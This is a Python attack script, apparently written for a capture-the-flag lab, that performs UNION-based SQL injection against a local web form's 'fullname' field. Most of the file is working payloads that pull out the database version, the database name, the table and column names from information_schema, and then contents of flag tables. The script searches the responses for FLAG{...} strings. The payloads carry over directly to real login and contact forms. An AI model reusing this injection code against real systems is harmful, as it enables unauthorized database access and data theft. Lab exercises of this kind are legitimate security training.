import requests
import urllib.parse
import re
import time

base_url = "http://127.0.0.1:32826"
target_endpoint = "/send.php"
target_url = base_url + target_endpoint

session = requests.Session()
session.redirects = True

def send_payload(param_name, payload, follow_redirects=False):
    """Send payload to specific parameter"""
    data = {
        "fullname": "test",
        "email": "test@example.com", 
        "phone": "1234567890",
        "subject": "test",
        "message": "test"
    }
    data[param_name] = payload
    
    try:
        response = session.post(target_url, data=data, allow_redirects=follow_redirects)
        return {
            'status_code': response.status_code,
            'body': response.text,
            'headers': dict(response.headers),
            'url': response.url,
            'time': response.elapsed.total_seconds(),
            'bytes': len(response.text)
        }
    except Exception as e:
        return {'error': str(e)}

# Strategic extraction - use first column for data display
print("=" * 80)
print("UNION-BASED DATA EXTRACTION - Target: fullname parameter")
print("=" * 80)

# 1. Extract database version
print("\n[1] Extracting database version...")
version_payload = "test' UNION SELECT @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- "
result = send_payload("fullname", version_payload, follow_redirects=True)
print(f"Status: {result['status_code']} | Size: {result['bytes']}B")

# Search for version in response
version_patterns = [r'\d+\.\d+\.\d+', r'MySQL', r'mariadb', r'MariaDB', r'\d+\.\d+', r'version', r'Version']
body = result['body']
version_found = False
for pattern in version_patterns:
    matches = re.findall(pattern, body, re.I)
    if matches:
        print(f"[+] Version-related matches: {matches[:10]}")
        version_found = True
        break

if not version_found:
    print("[-] No version info in visible output")

# 2. Extract database name
print("\n[2] Extracting current database...")
db_payload = "test' UNION SELECT database(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- "
result = send_payload("fullname", db_payload, follow_redirects=True)
print(f"Status: {result['status_code']} | Size: {result['bytes']}B")

# Look for database name patterns
db_matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]*)', body)
if db_matches:
    possible_dbs = [m for m in db_matches if len(m) > 2 and m not in ['html', 'div', 'span', 'class', 'src', 'href', 'http', 'https', 'www']]
    print(f"[+] Possible DB names: {possible_dbs[:5]}")

# 3. Extract all tables with improved parsing
print("\n[3] Extracting ALL table names...")
tables_payload = "test' UNION SELECT group_concat(table_name), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema=database()-- "
result = send_payload("fullname", tables_payload, follow_redirects=True)
print(f"Status: {result['status_code']} | Size: {result['bytes']}B")

body = result['body']
table_matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', body)
tables = []
for match in table_matches:
    if match.lower() in ['html', 'head', 'body', 'div', 'span', 'class', 'script', 'meta', 'title', 'link', 'href', 'src', 'http', 'https']:
        continue
    if len(match) > 3 and match not in tables:
        tables.append(match)

print(f"[+] Unique table-like words found: {tables[:20]}")

# 4. Try common tables one by one
common_tables = ['flag', 'flags', 'users', 'user', 'admin', 'config', 'settings', 'secret', 'secrets']
found_tables = []
for table in common_tables:
    if table in [t.lower() for t in tables]:
        print(f"[!] Found interesting table: {table}")
        found_tables.append(table)

# 5. Extract columns from the table if found
if found_tables:
    for table in found_tables:
        print(f"\n[4] Extracting columns from '{table}'...")
        columns_payload = f"test' UNION SELECT group_concat(column_name), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='{table}'-- "
        result = send_payload("fullname", columns_payload, follow_redirects=True)
        print(f"Status: {result['status_code']} | Size: {result['bytes']}B")
        
        # Extract column names
        col_matches = re.findall(r'([a-zA-Z_][a-zA-Z0-9_]{2,})', result['body'])
        columns = []
        for match in col_matches:
            if match.lower() not in ['html', 'head', 'body', 'div', 'span']:
                columns.append(match)
        print(f"[+] Possible columns: {columns[:15]}")

# 6. Extract direct data from tables
print("\n[5] Attempting direct data extraction...")
extract_queries = [
    "SELECT flag FROM flag LIMIT 1",
    "SELECT * FROM flag LIMIT 5",
    "SELECT flag_value FROM flags LIMIT 1",
    "SELECT * FROM flags LIMIT 3",
    "SELECT CONCAT(id, ':', flag) FROM flag LIMIT 5",
    "SELECT CONCAT(id, '-', data) FROM flags LIMIT 5",
]

for query in extract_queries:
    print(f"\n[*] Trying: {query}")
    data_payload = f"test' UNION SELECT ({query}), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- "
    result = send_payload("fullname", data_payload, follow_redirects=True)
    
    # Search for flag pattern in response
    body = result['body']
    flag_matches = re.findall(r'FLAG\{[^}]+\}', body)
    if flag_matches:
        print(f"[!] FLAGS FOUND: {flag_matches}")
        break
    else:
        # Look for query results in response
        if len(body) < 10000:  # Skip full page responses
            # Remove HTML tags to see if there's data
            clean_text = re.sub(r'<[^>]+>', ' ', body)
            clean_text = re.sub(r'\s+', ' ', clean_text).strip()
            if len(clean_text) > 100 and len(clean_text) < 500:
                print(f"[+] Cleaned response: {clean_text[:200]}")

print("\n" + "=" * 80)
print("SCRIPT EXECUTION COMPLETE")
print("Check for any FLAG patterns above.")
print("=" * 80)
